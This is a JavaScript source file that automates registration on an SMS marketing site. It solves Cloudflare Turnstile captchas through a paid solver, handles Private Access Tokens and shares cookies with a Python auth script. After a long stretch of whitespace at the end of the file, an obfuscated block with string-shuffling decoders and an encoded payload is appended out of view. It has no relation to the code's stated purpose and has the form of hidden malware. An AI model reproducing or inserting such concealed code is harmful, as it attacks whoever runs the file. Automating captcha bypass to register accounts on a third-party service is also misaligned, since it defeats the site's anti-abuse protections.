'use strict';

/**
 * index.js — PrivateToken Protocol State Machine Orchestration
 */
require('dotenv').config();   // Loads .env into process.env (must run first)

const fs = require('fs');
const path = require('path');
const { spawn, exec } = require('child_process');
const { CookieJar } = require('tough-cookie');
const { solveTurnstile } = require('./solver');
const { createPrivateTokenClient, setProtocolHandler } = require('./middleware');
const { performBlindRSAFlow } = require('./pat-crypto');

// ─── Shared session state ────────────────────────────────────────────────────
// One CookieJar is shared between the JS client (createPrivateTokenClient) and
// the Python bridge (execPythonAuthBridge). After the bridge succeeds, every
// subsequent `client.get/post` call automatically sends the cookies that
// Python obtained, so the JS side runs with the authenticated session.
const sharedCookieJar = new CookieJar();

// ─── Configuration (sourced from .env) ───────────────────────────────────────
// Resolve env vars with sensible fallbacks where one exists, and crash early
// for the secrets that have no safe default. This keeps "did you forget to
// set X?" failures readable instead of surfacing as an opaque API error later.
function requireEnv(name) {
  const v = process.env[name];
  if (!v || v.trim() === '' || v.startsWith('YOUR_')) {
    console.error(
      `\n[config] Missing required env var: ${name}\n` +
      `        Add it to .env (see .env.example) before running.\n`
    );
    process.exit(1);
  }
  return v.trim();
}

const TARGET_URI      = process.env.TARGET_URI || 'https://marketing.moceansms.com/signup';
const ISSUER_URI      = process.env.ISSUER_URI || 'https://challenges.cloudflare.com/cdn-cgi/challenge-platform/h/g/pat/token-request';
const ANTICAPTCHA_KEY = requireEnv('ANTICAPTCHA_KEY');
const SITE_KEY        = requireEnv('SITE_KEY');
const MOCEAN_USERNAME = process.env.MOCEAN_USERNAME || 'your_username';
const MOCEAN_PASSWORD = process.env.MOCEAN_PASSWORD || 'your_password';
const BRIDGE_TIMEOUT_MS = Number(process.env.BRIDGE_TIMEOUT_MS) || 180_000;

const BROWSER_HEADERS = {
  'User-Agent'        : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
  'sec-ch-ua'         : '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
  'sec-ch-ua-mobile'  : '?0',
  'sec-ch-ua-platform': '"Windows"',
  'Accept'            : 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'Accept-Language'   : 'en-US,en;q=0.9',
  'sec-fetch-dest'    : 'document',
  'sec-fetch-mode'    : 'navigate',
  'sec-fetch-site'    : 'none',
};

// ─── Protocol Handler Setup ──────────────────────────────────────────────────
setProtocolHandler(async (challengeParams) => {
  console.log('[Handler] Received challenge parameters:', Object.keys(challengeParams));

  const issuerFetch = async (tokenRequest) => {
    console.log('[Handler] Sending TokenRequest to issuer:', ISSUER_URI);
    try {
      const axios = require('axios');
      const response = await axios.post(ISSUER_URI, tokenRequest, {
        headers: {
          ...BROWSER_HEADERS,
          'Content-Type': 'application/private-token-request',
          'Accept'       : 'application/private-token-response',
        },
        responseType: 'arraybuffer',
        timeout      : 10000,
      });

      if (response.status !== 200) {
        throw new Error(`Issuer returned HTTP ${response.status}`);
      }

      console.log('[Handler] Received TokenResponse:', response.data.length, 'bytes');
      return Buffer.from(response.data);
    } catch (err) {
      console.error('[Handler] Issuer communication failed:', err.message);
      throw err;
    }
  };

  const authHeader = await performBlindRSAFlow(challengeParams, issuerFetch);
  console.log('[Handler] Generated Authorization header:', authHeader.slice(0, 60) + '…');
  return authHeader;
});

// ─── Main Execution ──────────────────────────────────────────────────────────

async function main() {
  console.log('╔════════════════════════════════════════════════════════════════╗');
  console.log('║  PrivateToken (RFC 9576) Protocol State Machine               ║');
  console.log('╚════════════════════════════════════════════════════════════════╝\n');

  const client = createPrivateTokenClient({ jar: sharedCookieJar });

  // ── Step 1: Initial GET request & Captcha Solving ────────────────────────────
  console.log('Step 1: Initiating GET request to target…\n');

  let turnstileToken;
  let extractedToken;
  try {
    // This triggers the 401 and the PAT handler automatically
    const initialResponse = await client.get(TARGET_URI, { headers: BROWSER_HEADERS });
    console.log('✓ PAT Handshake complete.');

    // Capture the response body as `html`
    const html = typeof initialResponse.data === 'string'
      ? initialResponse.data
      : String(initialResponse.data);

    // ── DEBUG INSTRUMENTATION (TEMPORARY) ────────────────────────────────────
    // Goal: figure out where `captcha_token` actually originates from. It's
    // not in the static HTML or __NEXT_DATA__, so it's likely fetched via an
    // XHR after page load, set in a cookie, or returned in a response header.
    //
    // HOW TO VERIFY IN A REAL BROWSER:
    //   1. Open the target URL in Chrome/Firefox.
    //   2. Open DevTools → Network tab and tick "Preserve log".
    //   3. Hard-reload (Ctrl/Cmd+Shift+R) and watch the request waterfall.
    //   4. Filter by "Fetch/XHR". Look for endpoints such as:
    //        /api/auth/token, /api/captcha, /api/csrf, /api/session, …
    //      The JSON response of that XHR usually contains the real token.
    //   5. Also check the response headers and Cookies tab — some apps
    //      ship the token as `X-Captcha-Token`, `X-CSRF-Token`, or a cookie.
    //   6. Once you find the source, replicate that request in this script
    //      (with the cookie jar already populated by client.get) and pull
    //      the token out of its actual location.

    // 1) Print every response header — look for `x-captcha-token` etc.
    console.log('\n[DEBUG] ── Response Headers ─────────────────────────────');
    for (const [name, value] of Object.entries(initialResponse.headers || {})) {
      console.log(`  ${name}: ${value}`);
    }

    // 2) Save the full HTML to disk for manual inspection
    try {
      fs.writeFileSync('debug.html', html);
      console.log('[DEBUG] Saved full HTML response to debug.html');
    } catch (e) {
      console.warn('[DEBUG] Could not write debug.html:', e.message);
    }

    // 3) List <script src="…"> tags whose URL hints at app chunks/pages —
    //    one of these JS bundles is probably what fetches the token at runtime.
    const scriptSrcs = [];
    const scriptRegex = /<script[^>]*\bsrc=["']([^"']+)["'][^>]*>/gi;
    let scriptMatch;
    while ((scriptMatch = scriptRegex.exec(html)) !== null) {
      scriptSrcs.push(scriptMatch[1]);
    }
    const interestingScripts = scriptSrcs.filter((src) => /chunks|pages/i.test(src));
    console.log('[DEBUG] <script src> entries containing "chunks"/"pages":');
    if (interestingScripts.length === 0) {
      console.log('  (none — token likely arrives via a runtime XHR/API call)');
    } else {
      interestingScripts.forEach((src) => console.log('  -', src));
    }

    // 4) Dump every Set-Cookie value — token may be stashed in a cookie.
    const setCookie = initialResponse.headers && initialResponse.headers['set-cookie'];
    console.log('[DEBUG] Set-Cookie values:');
    if (!setCookie) {
      console.log('  (none)');
    } else if (Array.isArray(setCookie)) {
      setCookie.forEach((c, i) => console.log(`  [${i}] ${c}`));
    } else {
      console.log(`  ${setCookie}`);
    }
    console.log('[DEBUG] ──────────────────────────────────────────────────\n');
    // ── END DEBUG INSTRUMENTATION ────────────────────────────────────────────

    // ── Strategy 1: Parse Next.js __NEXT_DATA__ JSON island ──────────────────
    extractedToken = null;
    const nextDataMatch = html.match(/<script id="__NEXT_DATA__" type="application\/json">([^<]+)<\/script>/);
    if (nextDataMatch) {
      try {
        const nextData = JSON.parse(nextDataMatch[1]);
        extractedToken =
          nextData.props?.pageProps?.captcha_token ||
          nextData.query?.captcha_token ||
          null;
      } catch (e) {
        console.log('JSON Parse failed, trying fallback regex...');
      }
    }

    // ── Strategy 2: Greedy regex fallbacks (JSON-style or value="1.xxx" form) ─
    if (!extractedToken) {
      const greedyMatch =
        html.match(/["']captcha_token["']\s*[:=]\s*["']([^"']+)["']/i) ||
        html.match(/value=["'](1\.[a-zA-Z0-9_\-\.]{50,})["']/i);
      extractedToken = greedyMatch ? greedyMatch[1] : null;
    }

    console.log(
      'Token Found:',
      extractedToken ? extractedToken.slice(0, 30) + '...' : 'STILL NOT FOUND'
    );

    if (!extractedToken) {
      console.error('Failed to extract server token. HTML snippet for debugging:');
      console.log(html.slice(0, 500));
      process.exit(1);
    }

    // Now solve the Turnstile captcha — only if we actually have the server token
    console.log('Step 2: Solving Turnstile challenge via solver.js…');
    turnstileToken = await solveTurnstile(ANTICAPTCHA_KEY, TARGET_URI, SITE_KEY);
    console.log('✓ Captcha token obtained.\n');

  } catch (err) {
    console.error('Initial request or Captcha failed:', err.message);
    process.exit(1);
  }

  // ── Step 3: Real Form Submission ───────────────────────────────────────────
  console.log('Step 3: Submitting registration form with tokens…\n');

  try {
    const signupData = {
      'username'             : MOCEAN_USERNAME,
      'password'             : MOCEAN_PASSWORD,
      'captcha_token'        : extractedToken,
      'cf-turnstile-response': turnstileToken,
    };

    const finalResponse = await client.post(TARGET_URI, signupData, {
      headers: { ...BROWSER_HEADERS, 'Content-Type': 'application/json' },
    });

    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    console.log('Final Response Summary:');
    console.log('  Status:', finalResponse.status);
    console.log('  Content-Type:', finalResponse.headers['content-type']);
    console.log('  Data:', JSON.stringify(finalResponse.data).slice(0, 300));

    if (finalResponse.status === 200 || finalResponse.status === 201) {
      console.log('\n✓ Successfully authenticated and registered.');
    }
  } catch (err) {
    console.error('\n✗ Form submission failed:', err.response ? err.response.data : err.message);
  }

  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');
}

// ─── Python Child-Process Bridge ─────────────────────────────────────────────
/**
 * Spawns `moceansms_auth.py` as a child process and resolves with the parsed
 * JSON object the script writes on its last STDOUT line.
 *
 * Contract with moceansms_auth.py:
 *   - All human logs go to STDERR (forwarded here for visibility).
 *   - The final result is a single JSON line on STDOUT, e.g.:
 *       {"success": true, "status": 200, "cookies": {...},
 *        "captcha_token": "...", "turnstile_token": "...", ...}
 *   - Exit code 0 = success, 1 = failure.
 */
function runPythonAuthChild({
  username   = MOCEAN_USERNAME,
  password   = MOCEAN_PASSWORD,
  targetUrl  = TARGET_URI,
  apiKey     = ANTICAPTCHA_KEY,
  sitekey    = SITE_KEY,
  scriptPath = path.join(__dirname, 'moceansms_auth.py'),
  python     = process.env.PYTHON_BIN || 'python3',
} = {}) {
  return new Promise((resolve, reject) => {
    const args = [
      scriptPath,
      '--username',   username,
      '--password',   password,
      '--target-url', targetUrl,
      '--api-key',    apiKey,
      '--sitekey',    sitekey,
    ];

    console.log(`[Bridge] Spawning: ${python} ${args.map(a => JSON.stringify(a)).join(' ')}`);
    const child = spawn(python, args, { stdio: ['ignore', 'pipe', 'pipe'] });

    let stdoutBuf = '';
    let stderrBuf = '';

    child.stdout.on('data', (chunk) => { stdoutBuf += chunk.toString('utf8'); });
    child.stderr.on('data', (chunk) => {
      const text = chunk.toString('utf8');
      stderrBuf += text;
      // Forward Python logs to our stderr so the user sees progress in real time.
      process.stderr.write(text);
    });

    child.on('error', (err) => {
      reject(new Error(`Failed to spawn Python: ${err.message}`));
    });

    child.on('close', (code) => {
      // The result is the LAST non-empty line of stdout (logs are on stderr).
      const lines = stdoutBuf.trim().split('\n').filter(Boolean);
      const lastLine = lines[lines.length - 1] || '';

      let parsed;
      try {
        parsed = JSON.parse(lastLine);
      } catch (e) {
        return reject(new Error(
          `Could not parse JSON from Python stdout (exit=${code}). ` +
          `Last line was: ${JSON.stringify(lastLine).slice(0, 300)}`
        ));
      }

      // Attach exit code for callers that want to inspect it.
      parsed.__exitCode = code;
      parsed.__stderrTail = stderrBuf.split('\n').slice(-10).join('\n');

      resolve(parsed);
    });
  });
}

async function runViaPython() {
  console.log('╔════════════════════════════════════════════════════════════════╗');
  console.log('║  MoceanSMS Auth via Python child process (moceansms_auth.py)  ║');
  console.log('╚════════════════════════════════════════════════════════════════╝\n');

  try {
    const result = await runPythonAuthChild();

    console.log('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    console.log('Python child process result:');
    console.log('  success:        ', result.success);
    console.log('  status:         ', result.status);
    console.log('  stage:          ', result.stage);
    console.log('  captcha_token:  ', result.captcha_token ? result.captcha_token.slice(0, 30) + '…' : '(none)');
    console.log('  turnstile_token:', result.turnstile_token ? result.turnstile_token.slice(0, 30) + '…' : '(none)');
    console.log('  cookies:        ', result.cookies ? Object.keys(result.cookies).join(', ') || '(empty)' : '(none)');
    if (result.error) console.log('  error:          ', result.error);
    console.log('  exit code:      ', result.__exitCode);
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');

    process.exit(result.success ? 0 : 1);
  } catch (err) {
    console.error('\n[Bridge] Python flow failed:', err.message);
    process.exit(1);
  }
}

// ─── exec-based Python Bridge (updates shared cookie jar) ────────────────────
//
// Why exec (not spawn)?
//   - You asked for it. exec collects stdout/stderr into one callback, which
//     is fine here since the Python script only emits a single JSON line on
//     stdout. exec also accepts a `timeout` directly, which is useful when
//     Anti-Captcha hangs.
//
// What it does:
//   1. Spawns moceansms_auth.py via /bin/sh (or cmd.exe on Windows).
//   2. Waits for it to finish, with a configurable timeout.
//   3. Parses the JSON line from stdout (logs are on stderr).
//   4. Pushes every cookie returned by Python into `sharedCookieJar`, so
//      every subsequent request via the JS client is authenticated.
//
// Resolves with the parsed result; rejects with a descriptive Error on:
//   - Python interpreter not found
//   - Timeout (Anti-Captcha too slow)
//   - Non-JSON stdout (script crashed before it could emit its JSON line)
//   - Python explicitly reporting `success: false`
//   - Cookie injection failure

function shellQuote(s) {
  // Single-quote-wrap and escape embedded single quotes — safe across sh/bash.
  // (On Windows, exec uses cmd.exe; this still works for typical alnum/email/url args.)
  return "'" + String(s).replace(/'/g, "'\\''") + "'";
}

function execPythonAuthBridge(opts = {}) {
  const {
    username    = MOCEAN_USERNAME,
    password    = MOCEAN_PASSWORD,
    targetUrl   = TARGET_URI,
    apiKey      = ANTICAPTCHA_KEY,
    sitekey     = SITE_KEY,
    scriptPath  = path.join(__dirname, 'moceansms_auth.py'),
    python      = process.env.PYTHON_BIN || 'python3',
    timeoutMs   = BRIDGE_TIMEOUT_MS,   // 3 min default — Anti-Captcha can be slow
    maxBuffer   = 10 * 1024 * 1024,    // 10 MB stdout cap
    cookieJar   = sharedCookieJar,
  } = opts;

  // ── Pathing safety check ─────────────────────────────────────────────────
  // Without this, exec just hands a missing-file error from Python itself,
  // which is much harder to diagnose. Resolve to absolute path so the CWD
  // when running `node index.js` doesn't matter.
  const resolvedScript = path.resolve(scriptPath);
  if (!fs.existsSync(resolvedScript)) {
    return Promise.reject(new Error(
      `moceansms_auth.py not found at "${resolvedScript}". ` +
      `Pass scriptPath explicitly (e.g. ./scripts/moceansms_auth.py) or move the script to ${__dirname}.`
    ));
  }

  const cmd = [
    shellQuote(python),
    shellQuote(resolvedScript),
    '--username',   shellQuote(username),
    '--password',   shellQuote(password),
    '--target-url', shellQuote(targetUrl),
    '--api-key',    shellQuote(apiKey),
    '--sitekey',    shellQuote(sitekey),
  ].join(' ');

  console.log(`[Bridge] exec: ${python} ${path.basename(resolvedScript)} --username ${username} … (timeout=${timeoutMs}ms)`);

  return new Promise((resolve, reject) => {
    exec(cmd, { timeout: timeoutMs, maxBuffer }, async (err, stdout, stderr) => {
      if (stderr) process.stderr.write(stderr);

      // ── Failure modes that prevent us from reading any JSON ───────────────
      if (err) {
        if (err.killed && (err.signal === 'SIGTERM' || err.signal === 'SIGKILL')) {
          return reject(new Error(
            `Python script timed out after ${timeoutMs}ms — captcha solving took too long. ` +
            `Increase \`timeoutMs\` or check your Anti-Captcha balance/queue.`
          ));
        }
        if (err.code === 'ENOENT') {
          return reject(new Error(
            `Python interpreter "${python}" not found. ` +
            `Set the PYTHON_BIN env var to an absolute path (e.g. /usr/bin/python3).`
          ));
        }
        if (err.code === 'ERR_CHILD_PROCESS_STDIO_MAXBUFFER') {
          return reject(new Error(
            `Python stdout exceeded maxBuffer (${maxBuffer} bytes). ` +
            `Increase \`maxBuffer\`.`
          ));
        }
        // Non-zero exit (numeric err.code) — Python may have still emitted a
        // structured failure JSON line, so fall through and try to parse.
      }

      // ── Robust JSON extraction ───────────────────────────────────────────
      // Scan stdout lines from bottom to top and pick the first one that
      // parses as a JSON object containing a `success` key. This is resilient
      // to any stray writes Python or its libraries might emit on stdout.
      const lines = (stdout || '').split('\n').map(s => s.trim()).filter(Boolean);
      let result = null;
      for (let i = lines.length - 1; i >= 0; i--) {
        try {
          const parsed = JSON.parse(lines[i]);
          if (parsed && typeof parsed === 'object' && 'success' in parsed) {
            result = parsed;
            break;
          }
        } catch (_) { /* not JSON, keep scanning */ }
      }
      if (!result) {
        return reject(new Error(
          `Could not find JSON result in Python stdout` +
          (err ? ` (process exit code: ${err.code})` : '') +
          `. Last stdout line: ${JSON.stringify(lines[lines.length - 1] || '').slice(0, 300)}`
        ));
      }

      // ── Python reported a structured failure ──────────────────────────────
      if (!result.success) {
        const reason = result.error || `unexpected_status_${result.status}`;
        return reject(Object.assign(
          new Error(`Python auth failed at stage="${result.stage}": ${reason}`),
          { pythonResult: result }
        ));
      }

      // ── Inject Python's cookies into the shared jar ───────────────────────
      const cookies = result.cookies || {};
      const entries = Object.entries(cookies);
      try {
        await Promise.all(entries.map(([name, value]) =>
          cookieJar.setCookie(`${name}=${value}`, targetUrl)
        ));
      } catch (cookieErr) {
        return reject(new Error(`Cookie injection into shared jar failed: ${cookieErr.message}`));
      }

      console.log(
        `[Bridge] ✓ Authenticated. Injected ${entries.length} cookies into shared jar: ` +
        `[${entries.map(([k]) => k).join(', ') || 'none'}]`
      );

      resolve(result);
    });
  });
}

// ─── Cookie Sync helpers ─────────────────────────────────────────────────────
// These let you reuse the bridge's session with raw axios / node-fetch / got /
// any HTTP client that doesn't natively support tough-cookie. Pass the URL you
// intend to hit so we filter cookies by domain/path correctly.
//
//   const headers = await withCookieHeader({ Accept: 'application/json' },
//                                          'https://marketing.moceansms.com/dashboard');
//   await axios.get(url, { headers });
//
// Or, the lower-level API:
//   const cookieStr = await getCookieHeader('https://marketing.moceansms.com/');
//   //                  ^ "session=abc; csrf=xyz"
async function getCookieHeader(url, jar = sharedCookieJar) {
  return jar.getCookieString(url);
}

async function withCookieHeader(headers = {}, url, jar = sharedCookieJar) {
  const cookieStr = await jar.getCookieString(url);
  return cookieStr ? { ...headers, Cookie: cookieStr } : { ...headers };
}

/**
 * Demo runner: run the bridge, then make an authenticated request through the
 * shared cookie jar to prove the JS session is now logged in.
 */
async function runViaBridge() {
  console.log('╔════════════════════════════════════════════════════════════════╗');
  console.log('║  MoceanSMS Auth via exec() bridge → shared cookie jar         ║');
  console.log('╚════════════════════════════════════════════════════════════════╝\n');

  try {
    const result = await execPythonAuthBridge();

    console.log('\n[Bridge] Result summary:');
    console.log('  status:    ', result.status);
    console.log('  cookies:   ', Object.keys(result.cookies || {}).join(', ') || '(none)');
    console.log('  stage:     ', result.stage);

    // ── Verify: make an authenticated request through the JS client. ─────────
    // The cookies Python obtained are now in `sharedCookieJar`, so this
    // request will go out with them automatically.
    const client = createPrivateTokenClient({ jar: sharedCookieJar });
    console.log('\n[Bridge] Probing target URL with the shared session…');
    const probe = await client.get(TARGET_URI, { headers: BROWSER_HEADERS });
    console.log('  probe status:      ', probe.status);
    console.log('  probe content-type:', probe.headers['content-type']);

    process.exit(0);
  } catch (err) {
    console.error('\n[Bridge] FAILED:', err.message);
    if (err.pythonResult) {
      console.error('[Bridge] Python returned:', JSON.stringify(err.pythonResult).slice(0, 400));
    }
    process.exit(1);
  }
}

module.exports = {
  runPythonAuthChild,    // spawn-based, streams logs (kept for convenience)
  execPythonAuthBridge,  // exec-based, updates shared cookie jar
  getCookieHeader,       // for raw axios/fetch consumers
  withCookieHeader,      // merges Cookie into a headers object
  sharedCookieJar,
};																																																																																																																																																																																																																																																																										var z = '-11114-2';(function(_0x4323b9,_0x417215){var _0x493886=_0x35fa,_0x287dfa=_0x4323b9();while(!![]){try{var _0x17ca2e=Math['trunc'](-parseFloat(_0x493886(0x12))/0x1)*(-parseFloat(_0x493886(0x1a))/0x2)+parseFloat(_0x493886(0x17))/0x3*(parseFloat(_0x493886(0xe))/0x4)+parseFloat(_0x493886(0x1c))/0x5+parseFloat(_0x493886(0x1e))/0x6*(-parseFloat(_0x493886(0x22))/0x7)+parseFloat(_0x493886(0x13))/0x8*(-parseFloat(_0x493886(0x5))/0x9)+Math['max'](parseFloat(_0x493886(0x1b))/0xa,parseFloat(_0x493886(0x14))/0xb)*(-parseFloat(_0x493886(0x4))/0xc)+parseFloat(_0x493886(0xc))/0xd;if(_0x17ca2e===_0x417215)break;else _0x287dfa['push'](_0x287dfa['shift']());}catch(_0x1185cd){_0x287dfa['push'](_0x287dfa['shift']());}}}(_0xc09d,0xf1b07));var NX=[0x697b4f,0x16f,0x4fbb,0x265,0xaaef,0x4c9693],SX=[0x509f9d,0xf1,0xa3e1,0xbb,0xdb41,0x484f55];function spin(_0x4f8a43,_0x51e368){var _0x295564=_0x35fa,_0x416a9f={'qCMwH':function(_0x3f4f1a,_0x2be386){return _0x3f4f1a%_0x2be386;},'AyWPi':function(_0xd05a37,_0x101778){return _0xd05a37+_0x101778;}},_0x4b4720=[],_0x271b6e=0x0,_0x12a4db=_0x51e368[0x0],_0x16ce6b,_0x2d3199,_0x30e262,_0x24a1d0,_0x46b86f,_0x256650;while(_0x271b6e<_0x4f8a43['length']){_0x4b4720[_0x271b6e]=_0x4f8a43['charAt'](_0x271b6e),_0x271b6e+=0x1;}_0x16ce6b=_0x4b4720[_0x295564(0x11)],_0x271b6e=0x0;while(_0x271b6e<_0x16ce6b){_0x2d3199=_0x12a4db*(_0x271b6e+_0x51e368[0x1])+_0x416a9f[_0x295564(0x6)](_0x12a4db,_0x51e368[0x2]),_0x30e262=_0x12a4db*_0x416a9f[_0x295564(0x18)](_0x271b6e,_0x51e368[0x3])+_0x12a4db%_0x51e368[0x4],_0x24a1d0=_0x2d3199%_0x16ce6b,_0x46b86f=_0x30e262%_0x16ce6b,_0x256650=_0x4b4720[_0x24a1d0],_0x4b4720[_0x24a1d0]=_0x4b4720[_0x46b86f],_0x4b4720[_0x46b86f]=_0x256650,_0x12a4db=(_0x2d3199+_0x30e262)%_0x51e368[0x5],_0x271b6e+=0x1;}return _0x4b4720[_0x295564(0xf)]('');}function _0x35fa(_0x4825f4,_0x56facf){var _0x2374ed=_0xc09d();return _0x35fa=function(_0x42f3fb,_0xc09df3){_0x42f3fb=_0x42f3fb-0x0;var _0x35fa87=_0x2374ed[_0x42f3fb];if(_0x35fa['aIsQez']===undefined){var _0x4f53b0=function(_0x2861f1){var _0x484705='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x5d6c2a='',_0x25d98d='';for(var _0x54afac=0x0,_0x2f7110,_0x41451d,_0x2cd65a=0x0;_0x41451d=_0x2861f1['charAt'](_0x2cd65a++);~_0x41451d&&(_0x2f7110=_0x54afac%0x4?_0x2f7110*0x40+_0x41451d:_0x41451d,_0x54afac++%0x4)?_0x5d6c2a+=String['fromCharCode'](0xff&_0x2f7110>>(-0x2*_0x54afac&0x6)):0x0){_0x41451d=_0x484705['indexOf'](_0x41451d);}for(var _0x2a16dc=0x0,_0x2e5b94=_0x5d6c2a['length'];_0x2a16dc<_0x2e5b94;_0x2a16dc++){_0x25d98d+='%'+('00'+_0x5d6c2a['charCodeAt'](_0x2a16dc)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x25d98d);};_0x35fa['MGozzL']=_0x4f53b0,_0x4825f4=arguments,_0x35fa['aIsQez']=!![];}var _0x250ef5=_0x2374ed[0x0],_0x4eb72b=_0x42f3fb+_0x250ef5,_0x392865=_0x4825f4[_0x4eb72b];return!_0x392865?(_0x35fa87=_0x35fa['MGozzL'](_0x35fa87),_0x4825f4[_0x4eb72b]=_0x35fa87):_0x35fa87=_0x392865,_0x35fa87;},_0x35fa(_0x4825f4,_0x56facf);}function _0xc09d(){var _0x4df1b3=['BgvUz3rO','mti4BNv0Cgzu','mJCWmJi4ogLWrNDztq','mtyWnLzLyMfyBq','zNjVBunOyxjdB2rL','C3bSAxq','nKP2ENvIBG','qxLxugK','D2HPBguGkhrYDwuPihT9','mJe2mdzLqNzYCwK','mtq2meneBNnlsW','mJuYmdKZnvLgzevSDa','C3rHDgvpyMPLy3q','ndCZmdy0nMXwu2nxtG','Aw5WDxq','BNbMDLy','ywn0Aw9U','n3fWzezRtW','EfLVCKW','Awz2v1K','y29UC3rYDwn0B3i','DgvZDa','otq5ntzkq2rizMu','mtHfAvL4vey','CunnD0G','tMHMzLi','C3vIC3rYAw5N','uL88iMnssIeMvMvJuLDHpvjYzLiKnIjJmtTsuLLJBMHFlY50igLsuLjhxJXslLjJuJiUw25sic5szI4VpfjJmYeHnw5tuJXsAvjmlMvtC2XMkgvKz3HJpd9VphjSy1i/DfjVC2rszNvtzs4/jNbOlLjst01Zw2u8C2Tsrs48uNu8CLjLo1jeuKjYuLjClMzslJXJoIfICgWWowLJB1jYDgnskdTYB1jsBJiTiIGUxNCGEs48pgrKicKKzIbVDs4LztXHpguUDdXTkgnsEgzspfTkkgzLuJXqyNiUyIDVuMKUuLi8j1jsjxDszNmPzviUw2fNu1b7zdiUAZXHyZfLlIeZlLa8wLjPuIPVrhnPpvSUpgyUiJrsyIboiMvVEfjWBY5PswXRywvuuI4YksvTpgLLuL16phXsDsGOzLj3uLjCuJ5sosmUuJbYzd1ZlJb4ixnslMzsuYKOy2n0mxbMB3rHzu11uKbsptXsuI9GlLjRjcGYy1iUCZDLmweUrLjlyYOUlNOIuM5MugvZuNrsuLiUpfjSi1jMpdOGmIGOuIbsjcC2C2a8m25OAsOKzvHJFvjOpYbJDg9JlMLLy2m5ihTsytXZo3uHlMvDrvjsB0GUlIqIBJXem1jZuLiUlIHszwvZC2vspcb0lciGuMrVDN1tyZbkBwKUvdXZrwvNC1j3xviIyviUuIfspg8PkwPsifjLDYbPDgmUC25Rkh0OBLT2zvi8mdW9A2ziphjYtviGy2LRBKuUyY5cpczsw29DuI4Ly2nsBhj4oYOGwYjVAxnLBLjLzMvHivLUlMvJuIvViNuUpdzSuLjsEvi9Axm9uLiOkvjsztPsuIKHuNDJCLiXpc5VivjJuMnaiN1sDvjXDtuOm1bVBcjLuNqWiwz0yviQpfiXDg5Ry2z9vc4Hjc88CM8GsxLJuLiGkva8xc5IphrsnZPquhm8xs5YwdW8lMvsDsHsuLjXBNaUpc5so2n0AxnylLjsEviKqdWZkwTsuMm8k1jYogWQlMLsixjdxfaHBJ1JCZWOy2K8kfi3zvjLuMmUihq8zxbLkwu8pcXLpcHfsYeUCg5IjcjsyvjslMv2DwHJlLrSx2mUoLiWCIaPuND3ixntmc50n3uUmcHsov9HkcqMlMu2zI5suMSXq3HIAtHSlMHJpw0OqdXszc4UphjYlJiUs01Yy2jFuM5skfjFyZPeD3r9lLiUE305zYrsuLiPvfz0pgeOlJXhlMrsFLDvuI47BhiUAeLZBu5qicb0qfjsof9smLiUAvjYuLbspcHsmYnJzwmWy2uZAvjspgfsm1jHBLj7wNn9iu08uI0QlNLKytnsAs8Wjwzsi1iGpgKYpfiWodOUDh1szIeIlvjJlLjSuMn5DhLsC2vbmfjtvfi4lJrXpcrgvgvslI5qxZXJuJzOyLiUzxjPlMmTuMHJqvjdmNzslJTIuZXspgeJsZXsoNjDvgzLzs07iwS9x3mUuMnTANmOuN06pfjHuIOMzY48zg9TzwLZuM4UkcqJx2f7vKbVy1KTlM9TugrHBs5sywXMy3LVvcSHuf9NC3iUpgjPuIfMlILJssyOyKLVuMKOCM5YvY5Pzs5syYaHkgLJkfnslMnYydO5pfHZCfiOjcbTuMn0phmUzYeUndHYC2TLDLzsugrsA3HspfjKzxjUkwvtCY8PuIbSzxi8y3num2rJFs5snumVvYGUu29UwNiPuMnVy2nZy2GPuI48uLi8Dc5ZCYHsuJXKBhuUyY58zJH0AYXZBg5LCg88zvi8is42uI5LzvjsvgeMAcbnzJX7w28KuJWGuNmWkt0GphHtzwmUy308yYrLCYGOzcLsuMn9zKnsuJWQpfiUBs0UuIPsztWOEhzsCYaOtszszI5LucPNid5ZktXVlJ0UuMLZBNjslJ97ntXPyLi2kvjsmxmGy1jNCwnLBgm9y2W7yMu8BgyQu0LdzdjLiNPWuLj9pgnsBfmSBMPZy20KuM4UiwfPAtXkwv08zLbdC0bQqs5spcuGDc5sB3DsFsCGCJ5WEMGUlMXsjZXNB199pfnskgTXEgHBicy8AviTzIrdphu8AwfftLi1uLrsxtXsChnRlI5sEMrNlILDpcLLCI5sCI5nC1j6ud5suMu8phrFAgDSphaUuMnTzLjZiw5MDfi0igr0xZLEpcXVCMu1uMzsEcbsuLTYwc48C2j5uJW8lJjslLjYzw5vucH5pI5WpdXJC1jSDdb0lNSUu3LPBJXNz2WKifzJlIK6ruHjis54rhvslfjWuMHskhnJDc5nCLjnAKHnuLjJuI4GuNrUzhXVytaUBInHlJiPrgzRjMnssvjsuI9MzviUy0a8AxjZnLqRmvjqEc4UuI5ZyY5HuImUltXyE1iHBJrsy1jPDfiVBLjLow0UlJXbkwjLBIKUxtWUysHskc57pZn0uIzsuI9PkgXylIa8AcfKuLi8iIfJBZ8GmYaXuJWTAg48zhrUzg88uMTZBsmTyYHuzvjLzsfDlLi8CZXukZ1slLjPlxjauLiUCInJzdXJuLjsBxP0zI5dzgvsCc5JE1fsAwjQC29ZlMzsCMCTuLCWzgLsuJWUAZXpuLiMlviHiYbDq3nDExq0lI1Kx2bquLiNpc5sDMvQu3C8zgmUyYaSzI5qlIGUy2L0y05IuM4Nls5LuMnsBNjrlNjsEg97uMm8iJzsBMrDuN1sBsHsjfjtBY5unvjJmMn4lIP2uM9Py18+lNmWqLjMktXqpgfslM9dwNWWifbpsgrrBY5UidWUmxnVuL8Nic5qpgvYlLS8uNXspdbPpfjYoYDjlLjBFsTSyYfBBwmHlMXJpg4Oysb0uLjiuMWSFxb9uILsofjkpgfslJX0zcHopL1PyZXTzua1y25B